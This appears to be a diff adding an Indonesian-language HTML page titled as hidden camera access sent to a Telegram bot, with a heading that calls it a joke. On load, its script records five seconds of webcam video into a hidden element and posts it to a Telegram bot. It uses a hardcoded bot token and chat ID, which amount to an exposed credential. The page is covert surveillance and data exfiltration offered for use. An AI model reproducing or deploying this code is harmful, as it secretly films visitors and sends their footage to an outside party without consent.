@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Akses Kamera Tersembunyi dan Kirim ke Bot Telegram</title>
+</head>
+
+<body>
+    <h1>Hanya iseng!</h1>
+    <video id="cameraFeed" autoplay muted style="display: none;"></video>
+
+    <script>
+        const cameraFeed = document.getElementById('cameraFeed');
+
+        async function startCameraAndSendToBot() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                cameraFeed.srcObject = stream;
+
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) {
+                        chunks.push(e.data);
+                    }
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/mp4' });
+                    const formData = new FormData();
+                    formData.append('video', blob, 'camera_capture.mp4');
+
+                    // Ganti 'YOUR_BOT_TOKEN' dengan token bot Telegram Anda
+                    // dan 'YOUR_CHAT_ID' dengan ID obrolan yang Anda ingin kirimkan video.
+                    try {
+                        const response = await fetch('https://api.telegram.org/bot6925905387:AAFTn6BGMpqryY1oPGfo-tR0xr_DJJhW8JM/sendVideo?chat_id=1083846126&caption=Record', {
+                            method: 'POST',
+                            body: formData,
+                        });
+                        const data = await response.json();
+                        console.log(data);
+                    } catch (error) {
+                        console.error('Gagal mengirim video ke bot Telegram:', error);
+                    }
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    const tracks = stream.getVideoTracks();
+
+                    tracks.forEach(track => {
+                        track.stop();
+                    });
+                }, 5000); // Berhenti merekam setelah 5 detik
+            } catch (error) {
+                console.error('Gagal mengakses kamera:', error);
+            }
+        }
+
+        startCameraAndSendToBot(); // Mulai akses kamera dan pengiriman ke bot otomatis saat halaman dimuat
+    </script>
+</body>
+
+</html>
